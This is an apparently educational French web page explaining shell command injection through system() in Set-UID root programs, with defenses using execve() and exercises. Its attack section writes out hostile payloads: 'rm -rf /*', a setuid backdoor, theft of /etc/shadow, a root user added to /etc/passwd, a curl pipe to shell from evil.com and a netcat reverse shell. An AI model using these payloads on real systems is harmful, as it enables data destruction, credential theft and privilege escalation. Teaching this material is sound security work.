<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S√©curit√© system() dans Set-UID - Claude Explains</title>
    <link rel="stylesheet" href="claude-explains.min.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>S√âCURIT√â DES APPELS SYST√àME DANS LES PROGRAMMES SET-UID</h1>
            <p class="subtitle">Pourquoi system() est un danger critique et comment l'exploiter/s'en prot√©ger</p>
            <div>
                <span class="badge badge-danger"><span>CRITIQUE</span></span>
                <span class="badge badge-warning"><span>INJECTION</span></span>
                <span class="badge badge-danger"><span>PRIVILEGE ESCALATION</span></span>
            </div>
        </header>
        
        <nav class="navigation">
            <button class="btn-primary active" data-section="intro"><span>Introduction</span></button>
            <button class="btn-primary" data-section="problem"><span>Le Probl√®me</span></button>
            <button class="btn-primary" data-section="attack"><span>Anatomie de l'Attaque</span></button>
            <button class="btn-primary" data-section="mechanics"><span>M√©canique Interne</span></button>
            <button class="btn-primary" data-section="defense"><span>D√©fense</span></button>
            <button class="btn-primary" data-section="challenge"><span>Challenge</span></button>
        </nav>
        
        <main>
            <!-- ============================================ -->
            <!-- INTRODUCTION INTUITIVE -->
            <!-- ============================================ -->
            <section id="intro" class="section active">
                <div class="content-box">
                    <h2>üé≠ L'Analogie du Majordome Trop Ob√©issant</h2>
                    
                    <p>Imagine que tu as un <strong>majordome tr√®s puissant</strong> (un programme Set-UID root) qui peut faire n'importe quoi dans ta maison (syst√®me). Tu lui donnes des ordres comme :</p>
                    
                    <div class="code-block">
                        <code>"Envoie un message √† Jean"</code>
                    </div>
                    
                    <p>Le probl√®me ? Ce majordome est <span class="highlight">trop litt√©ral</span>. Si tu dis :</p>
                    
                    <div class="code-block">
                        <code>"Envoie un message √† Jean ; puis br√ªle la maison ; puis donne-moi les cl√©s"</code>
                    </div>
                    
                    <p>Il va <strong>ex√©cuter TOUTES les commandes</strong> sans se poser de questions, parce que tu as utilis√© le mot magique <code>;</code> (point-virgule) qui signifie "et ensuite fais √ßa".</p>
                    
                    <h3>Le Vrai Probl√®me en S√©curit√©</h3>
                    
                    <p>Dans le code que tu as vu :</p>
                    
                    <div class="code-block">
                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
                        <code>sprintf(command, "/bin/mail %s", User_Input);
system(command);</code>
                    </div>
                    
                    <p>On prend une <strong>entr√©e utilisateur non v√©rifi√©e</strong> et on la passe directement √† <code>system()</code>. C'est comme donner un micro ouvert √† un inconnu dans ta maison et lui dire "dis au majordome ce que tu veux".</p>
                    
                    <div class="warning-box">
                        <p><strong>Pourquoi c'est CRITIQUE dans un Set-UID ?</strong></p>
                        <p>Parce que le programme s'ex√©cute avec les <span class="highlight">privil√®ges root</span>. Un utilisateur normal peut donc faire ex√©cuter des commandes root simplement en manipulant l'entr√©e.</p>
                    </div>
                </div>
            </section>

            <!-- ============================================ -->
            <!-- LE PROBL√àME EN PROFONDEUR -->
            <!-- ============================================ -->
            <section id="problem" class="section">
                <div class="content-box">
                    <h2>üîç Diss√©quons le Code Vuln√©rable</h2>
                    
                    <h3>√âtape 1 : Que fait ce code ?</h3>
                    
                    <div class="code-block">
                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
                        <code>// Ligne 1 : Construction de la commande
sprintf(command, "/bin/mail %s", User_Input);

// Ligne 2 : Ex√©cution via le shell
system(command);</code>
                    </div>
                    
                    <p><strong>Intention l√©gitime :</strong></p>
                    <ul>
                        <li>L'utilisateur entre une adresse email : <code>alice@example.com</code></li>
                        <li><code>sprintf</code> construit : <code>"/bin/mail alice@example.com"</code></li>
                        <li><code>system()</code> ex√©cute cette commande</li>
                    </ul>
                    
                    <h3>√âtape 2 : Pourquoi system() est dangereux ?</h3>
                    
                    <p>Contrairement √† ce qu'on pourrait croire, <code>system()</code> ne lance PAS directement <code>/bin/mail</code>. Voici ce qui se passe r√©ellement :</p>
                    
                    <div class="code-block">
                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
                        <code>// Ce que system() fait en interne :
execl("/bin/sh", "sh", "-c", command, (char *)0);</code>
                    </div>
                    
                    <p>Traduction : <code>system()</code> lance d'abord un <strong>shell</strong> (<code>/bin/sh</code>), puis demande √† ce shell d'interpr√©ter la commande.</p>
                    
                    <div class="warning-box">
                        <p><strong>Pourquoi c'est un probl√®me ?</strong></p>
                        <p>Le shell comprend les <span class="highlight">m√©tacaract√®res</span> : <code>;</code>, <code>|</code>, <code>&</code>, <code>`</code>, <code>$</code>, etc. Ces caract√®res permettent d'encha√Æner, rediriger, ou modifier l'ex√©cution des commandes.</p>
                    </div>
                    
                    <h3>√âtape 3 : Les m√©tacaract√®res du shell</h3>
                    
                    <table class="comparison-table">
                        <thead>
                            <tr>
                                <th>Caract√®re</th>
                                <th>Signification</th>
                                <th>Exemple</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td><code>;</code></td>
                                <td>S√©quence de commandes</td>
                                <td><code>cmd1 ; cmd2</code> ‚Üí ex√©cute cmd1 puis cmd2</td>
                            </tr>
                            <tr>
                                <td><code>|</code></td>
                                <td>Pipe (redirection)</td>
                                <td><code>cmd1 | cmd2</code> ‚Üí sortie de cmd1 ‚Üí entr√©e de cmd2</td>
                            </tr>
                            <tr>
                                <td><code>&</code></td>
                                <td>Ex√©cution en arri√®re-plan</td>
                                <td><code>cmd &</code> ‚Üí lance cmd sans attendre</td>
                            </tr>
                            <tr>
                                <td><code>`</code> ou <code>$()</code></td>
                                <td>Substitution de commande</td>
                                <td><code>echo `whoami`</code> ‚Üí ex√©cute whoami et ins√®re le r√©sultat</td>
                            </tr>
                            <tr>
                                <td><code>&gt;</code> / <code>&lt;</code></td>
                                <td>Redirection d'entr√©e/sortie</td>
                                <td><code>cmd > file</code> ‚Üí √©crit la sortie dans file</td>
                            </tr>
                            <tr>
                                <td><code>&&</code> / <code>||</code></td>
                                <td>Conditionnels</td>
                                <td><code>cmd1 && cmd2</code> ‚Üí cmd2 si cmd1 r√©ussit</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </section>

            <!-- ============================================ -->
            <!-- ANATOMIE DE L'ATTAQUE -->
            <!-- ============================================ -->
            <section id="attack" class="section">
                <div class="content-box">
                    <h2>üíÄ L'Attaque en Action</h2>
                    
                    <h3>Payload Malveillant</h3>
                    
                    <p>L'attaquant entre ceci comme <code>User_Input</code> :</p>
                    
                    <div class="code-block">
                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
                        <code>xyz@example.com ; rm -rf /* ; /bin/sh</code>
                    </div>
                    
                    <h3>D√©composition √âtape par √âtape</h3>
                    
                    <p><strong>√âtape 1 : Construction de la commande</strong></p>
                    
                    <div class="code-block">
                        <code>// Ce que sprintf() produit :
command = "/bin/mail xyz@example.com ; rm -rf /* ; /bin/sh"</code>
                    </div>
                    
                    <p><strong>√âtape 2 : Ex√©cution par system()</strong></p>
                    
                    <p>Le shell voit cette cha√Æne et la d√©coupe selon les <code>;</code> :</p>
                    
                    <div class="code-block">
                        <code>Commande 1: /bin/mail xyz@example.com
Commande 2: rm -rf /*
Commande 3: /bin/sh</code>
                    </div>
                    
                    <p><strong>√âtape 3 : Ex√©cution s√©quentielle</strong></p>
                    
                    <ol>
                        <li><code>/bin/mail xyz@example.com</code> ‚Üí S'ex√©cute (peut √©chouer, on s'en fiche)</li>
                        <li><code>rm -rf /*</code> ‚Üí <span class="badge badge-danger"><span>D√âTRUIT LE SYST√àME</span></span></li>
                        <li><code>/bin/sh</code> ‚Üí <span class="badge badge-danger"><span>OUVRE UN SHELL ROOT</span></span></li>
                    </ol>
                    
                    <div class="warning-box">
                        <p><strong>R√©sultat Final</strong></p>
                        <p>L'attaquant obtient un <span class="highlight">shell root interactif</span> dans un programme qui √©tait cens√© juste envoyer un email. C'est l'escalade de privil√®ges totale.</p>
                    </div>
                    
                    <h3>Variations d'Attaque</h3>
                    
                    <div class="simulator">
                        <h3>Autres Payloads Possibles</h3>
                        
                        <div class="code-block">
                            <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
                            <code>// 1. Cr√©er un backdoor
user@host ; cp /bin/sh /tmp/backdoor ; chmod 4755 /tmp/backdoor

// 2. Voler /etc/shadow
user@host ; cat /etc/shadow > /tmp/stolen

// 3. Ajouter un utilisateur root
user@host ; echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd

// 4. Ex√©cuter un script distant
user@host ; curl http://evil.com/malware.sh | sh

// 5. Netcat reverse shell
user@host ; nc -e /bin/sh attacker.com 4444</code>
                        </div>
                    </div>
                </div>
            </section>

            <!-- ============================================ -->
            <!-- M√âCANIQUE INTERNE -->
            <!-- ============================================ -->
            <section id="mechanics" class="section">
                <div class="content-box">
                    <h2>‚öôÔ∏è Pourquoi √áa Marche : M√©canique Interne</h2>
                    
                    <h3>1. Qu'est-ce que system() fait vraiment ?</h3>
                    
                    <p>Voici l'impl√©mentation simplifi√©e de <code>system()</code> :</p>
                    
                    <div class="code-block">
                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
                        <code>int system(const char *command) {
    pid_t pid;
    int status;
    
    // Fork un nouveau processus
    pid = fork();
    
    if (pid == 0) {
        // Processus enfant : lance le shell
        execl("/bin/sh", "sh", "-c", command, (char *)0);
        _exit(127);
    }
    
    // Processus parent : attend la fin
    waitpid(pid, &status, 0);
    return status;
}</code>
                    </div>
                    
                    <p><strong>Ligne critique</strong> : <code>execl("/bin/sh", "sh", "-c", command, ...);</code></p>
                    
                    <ul>
                        <li><code>/bin/sh</code> : Le shell √† lancer</li>
                        <li><code>-c</code> : "Execute la commande qui suit"</li>
                        <li><code>command</code> : Notre cha√Æne contamin√©e</li>
                    </ul>
                    
                    <h3>2. Le parsing du shell</h3>
                    
                    <p>Quand le shell re√ßoit <code>-c "cmd1 ; cmd2"</code>, voici son traitement :</p>
                    
                    <div class="code-block">
                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
                        <code>// Pseudo-code du shell
void execute_command(char *cmdline) {
    // 1. Tokenisation selon les m√©tacaract√®res
    tokens = split_by_metacharacters(cmdline); // [cmd1, cmd2, cmd3]
    
    // 2. Ex√©cution s√©quentielle
    for (token in tokens) {
        if (is_separator(token)) {
            continue; // Ignore ; | & etc
        }
        execute_single_command(token);
    }
}</code>
                    </div>
                    
                    <p>Le shell ne fait <strong>aucune distinction</strong> entre :</p>
                    <ul>
                        <li>Les commandes pr√©vues par le d√©veloppeur</li>
                        <li>Les commandes inject√©es par l'utilisateur</li>
                    </ul>
                    
                    <h3>3. Privil√®ges et Set-UID</h3>
                    
                    <p>Rappel : un programme Set-UID root s'ex√©cute avec <code>euid=0</code> (root). Quand il appelle <code>system()</code> :</p>
                    
                    <div class="code-block">
                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
                        <code>// Le processus parent (Set-UID)
euid = 0 (root)
uid = 1000 (utilisateur normal)

// Fork ‚Üí Le fils h√©rite des privil√®ges
fork() ‚Üí pid = X

// Dans le fils (pid=X)
euid = 0 (root) ‚Üê TOUJOURS ROOT
execl("/bin/sh", ...) ‚Üí Lance le shell EN ROOT

// Le shell lance nos commandes EN ROOT
rm -rf /* ‚Üí S'ex√©cute avec euid=0</code>
                    </div>
                    
                    <div class="warning-box">
                        <p><strong>Point Cl√©</strong></p>
                        <p>Le shell h√©rit√© via <code>system()</code> conserve les privil√®ges root du programme Set-UID. Toutes les commandes inject√©es s'ex√©cutent donc en root.</p>
                    </div>
                    
                    <h3>4. Comparaison : system() vs execve()</h3>
                    
                    <table class="comparison-table">
                        <thead>
                            <tr>
                                <th>Aspect</th>
                                <th>system()</th>
                                <th>execve()</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>Interm√©diaire</td>
                                <td><span class="badge badge-danger"><span>SHELL</span></span></td>
                                <td><span class="badge badge-success"><span>DIRECT</span></span></td>
                            </tr>
                            <tr>
                                <td>M√©tacaract√®res</td>
                                <td><span class="badge badge-danger"><span>INTERPR√âT√âS</span></span></td>
                                <td><span class="badge badge-success"><span>IGNOR√âS</span></span></td>
                            </tr>
                            <tr>
                                <td>Injection possible</td>
                                <td><span class="badge badge-danger"><span>OUI</span></span></td>
                                <td><span class="badge badge-success"><span>NON</span></span></td>
                            </tr>
                            <tr>
                                <td>Contr√¥le arguments</td>
                                <td><span class="badge badge-danger"><span>FAIBLE</span></span></td>
                                <td><span class="badge badge-success"><span>TOTAL</span></span></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </section>

            <!-- ============================================ -->
            <!-- D√âFENSE ET SOLUTIONS -->
            <!-- ============================================ -->
            <section id="defense" class="section">
                <div class="content-box">
                    <h2>üõ°Ô∏è Comment se D√©fendre</h2>
                    
                    <h3>Solution 1 : Utiliser execve() Directement</h3>
                    
                    <p><strong>Principe :</strong> √âviter compl√®tement le shell en passant les arguments de mani√®re structur√©e.</p>
                    
                    <div class="code-block">
                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
                        <code>// VERSION S√âCURIS√âE
pid_t pid = fork();

if (pid == 0) {
    // Arguments s√©par√©s : le shell ne peut pas les interpr√©ter
    char *args[] = {"/bin/mail", User_Input, NULL};
    execve("/bin/mail", args, NULL);
    _exit(1);
}

waitpid(pid, NULL, 0);</code>
                    </div>
                    
                    <p><strong>Pourquoi c'est s√ªr ?</strong></p>
                    <ul>
                        <li><code>execve()</code> lance directement <code>/bin/mail</code> sans passer par un shell</li>
                        <li><code>User_Input</code> est pass√© comme un <strong>argument unique</strong>, pas interpr√©t√©</li>
                        <li>M√™me si <code>User_Input</code> contient <code>;</code>, ce sera trait√© comme un caract√®re litt√©ral</li>
                    </ul>
                    
                    <h3>Solution 2 : Validation et Sanitization</h3>
                    
                    <p>Si on DOIT utiliser <code>system()</code> (rare), on doit <strong>whitelist</strong> les caract√®res autoris√©s :</p>
                    
                    <div class="code-block">
                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
                        <code>// Fonction de validation stricte
int is_safe_email(const char *input) {
    // Regex simple : alphanum√©rique + @ + . + -
    for (int i = 0; input[i] != '\0'; i++) {
        char c = input[i];
        if (!isalnum(c) && c != '@' && c != '.' && c != '-' && c != '_') {
            return 0; // Caract√®re suspect d√©tect√©
        }
    }
    return 1;
}

// Utilisation
if (!is_safe_email(User_Input)) {
    fprintf(stderr, "Invalid email format\n");
    exit(1);
}

sprintf(command, "/bin/mail %s", User_Input);
system(command);</code>
                    </div>
                    
                    <div class="warning-box">
                        <p><strong>Attention :</strong> Cette approche est fragile. Un oubli dans la validation = faille. Pr√©f√©rez toujours <code>execve()</code>.</p>
                    </div>
                    
                    <h3>Solution 3 : Supprimer les Privil√®ges Avant system()</h3>
                    
                    <p>Si on doit lancer un shell, au moins retirer les privil√®ges root avant :</p>
                    
                    <div class="code-block">
                        <button class="copy-btn" onclick="copyCode(this)"><span>Copier</span></button>
                        <code>// Abaisser les privil√®ges
setuid(getuid()); // euid = uid (utilisateur normal)

// Maintenant system() ne peut plus faire de d√©g√¢ts root
sprintf(command, "/bin/mail %s", User_Input);
system(command);</code>
                    </div>
                    
                    <p><strong>Probl√®me :</strong> Cette solution ne prot√®ge pas contre les attaques sur les fichiers de l'utilisateur. C'est mieux, mais pas parfait.</p>
                    
                    <h3>Tableau R√©capitulatif</h3>
                    
                    <table class="comparison-table">
                        <thead>
                            <tr>
                                <th>M√©thode</th>
                                <th>S√©curit√©</th>
                                <th>Complexit√©</th>
                                <th>Recommandation</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td><code>system()</code> brut</td>
                                <td><span class="badge badge-danger"><span>DANGER</span></span></td>
                                <td>Facile</td>
                                <td>‚ùå NE JAMAIS UTILISER</td>
                            </tr>
                            <tr>
                                <td><code>system()</code> + validation</td>
                                <td><span class="badge badge-warning"><span>RISQU√â</span></span></td>
                                <td>Moyen</td>
                                <td>‚ö†Ô∏è √âviter si possible</td>
                            </tr>
                            <tr>
                                <td><code>system()</code> + drop privs</td>
                                <td><span class="badge badge-warning"><span>PARTIEL</span></span></td>
                                <td>Moyen</td>
                                <td>‚ö†Ô∏è Mieux mais insuffisant</td>
                            </tr>
                            <tr>
                                <td><code>execve()</code> direct</td>
                                <td><span class="badge badge-success"><span>S√âCURIS√â</span></span></td>
                                <td>L√©g√®rement plus complexe</td>
                                <td>‚úÖ TOUJOURS PR√âF√âRER</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </section>

            <!-- ============================================ -->
            <!-- CHALLENGE INTERACTIF -->
            <!-- ============================================ -->
            <section id="challenge" class="section">
                <div class="content-box">
                    <h2>üéØ Challenge : Teste ta Compr√©hension</h2>
                    
                    <h3>Partie 1 : Analyse de Code</h3>
                    
                    <p>Pour chaque code, d√©termine s'il est vuln√©rable et explique pourquoi :</p>
                    
                    <div class="simulator">
                        <h3>Code A</h3>
                        <div class="code-block">
                            <code>char cmd[256];
sprintf(cmd, "echo %s >> /var/log/user.log", username);
system(cmd);</code>
                        </div>
                        <p><strong>Question :</strong> Vuln√©rable ? Comment exploiter ?</p>
                    </div>
                    
                    <div class="simulator">
                        <h3>Code B</h3>
                        <div class="code-block">
                            <code>char *args[] = {"echo", username, NULL};
execve("/bin/echo", args, NULL);</code>
                        </div>
                        <p><strong>Question :</strong> Vuln√©rable ? Pourquoi ou pourquoi pas ?</p>
                    </div>
                    
                    <div class="simulator">
                        <h3>Code C</h3>
                        <div class="code-block">
                            <code>if (strstr(filename, "..") == NULL) {
    sprintf(cmd, "cat %s", filename);
    system(cmd);
}</code>
                        </div>
                        <p><strong>Question :</strong> La validation est-elle suffisante ? Trouve un bypass.</p>
                    </div>
                    
                    <h3>Partie 2 : Exploitation Pratique</h3>
                    
                    <div class="simulator">
                        <h3>Sc√©nario</h3>
                        <p>Tu as acc√®s √† ce programme Set-UID root :</p>
                        
                        <div class="code-block">
                            <code>// backup_tool (Set-UID root)
int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s &lt;directory&gt;\n", argv[0]);
        return 1;
    }
    
    char cmd[512];
    sprintf(cmd, "tar -czf /backup/backup.tar.gz %s", argv[1]);
    system(cmd);
    
    printf("Backup completed!\n");
    return 0;
}</code>
                        </div>
                        
                        <p><strong>Questions :</strong></p>
                        <ol>
                            <li>√âcris un payload qui donne un shell root</li>
                            <li>√âcris un payload qui copie <code>/etc/shadow</code> dans <code>/tmp/stolen</code></li>
                            <li>R√©√©cris ce programme de mani√®re s√©curis√©e avec <code>execve()</code></li>
                        </ol>
                    </div>
                    
                    <h3>Partie 3 : D√©fense</h3>
                    
                    <div class="simulator">
                        <h3>Corrige ce code</h3>
                        <div class="code-block">
                            <code>// mail_notifier (Set-UID root)
void send_alert(char *message) {
    char cmd[1024];
    sprintf(cmd, "echo '%s' | mail -s 'Alert' admin@example.com", message);
    system(cmd);
}</code>
                        </div>
                        
                        <p><strong>T√¢che :</strong> R√©√©cris cette fonction de 3 mani√®res diff√©rentes, en ordre croissant de s√©curit√©.</p>
                    </div>
                    
                    <h3>Checklist de Compr√©hension</h3>
                    
                    <p>Tu as compris si tu peux expliquer :</p>
                    
                    <ul>
                        <li>‚úÖ Pourquoi <code>system()</code> lance un shell et pas la commande directement</li>
                        <li>‚úÖ Ce que sont les m√©tacaract√®res et comment le shell les interpr√®te</li>
                        <li>‚úÖ Pourquoi <code>;</code> permet d'encha√Æner des commandes</li>
                        <li>‚úÖ Comment les privil√®ges sont h√©rit√©s lors d'un <code>fork()</code></li>
                        <li>‚úÖ La diff√©rence fondamentale entre <code>system()</code> et <code>execve()</code></li>
                        <li>‚úÖ Pourquoi la validation par blacklist est insuffisante</li>
                        <li>‚úÖ Comment construire un payload d'exploitation complet</li>
                    </ul>
                </div>
            </section>
        </main>
    </div>
    
    <script src="claude-explains.min.js"></script>
</body>
</html>
